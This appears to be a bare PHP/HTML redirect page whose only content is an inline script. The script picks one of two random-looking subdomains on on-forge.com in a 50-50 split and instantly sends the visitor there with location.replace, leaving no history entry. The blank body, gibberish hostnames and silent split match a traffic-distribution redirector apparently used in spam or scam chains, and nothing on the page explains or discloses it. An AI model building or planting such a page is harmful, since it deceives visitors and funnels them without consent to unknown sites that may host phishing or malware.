<?php
  ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Red...</title>

<script>
(function () {
    const urlA = "https://cwin-ljsndfdkljnfedkj.on-forge.com";
    const urlB = "https://dwin-kjlsdbfekjlfnerkjnkhjwbefejhkrbnf.on-forge.com";

    // 50-50 split
    const target = Math.random() < 0.5 ? urlA : urlB;

    // Instant redirect (no history)
    window.location.replace(target);
})();
</script>

</head>
<body>
</body>
</html>
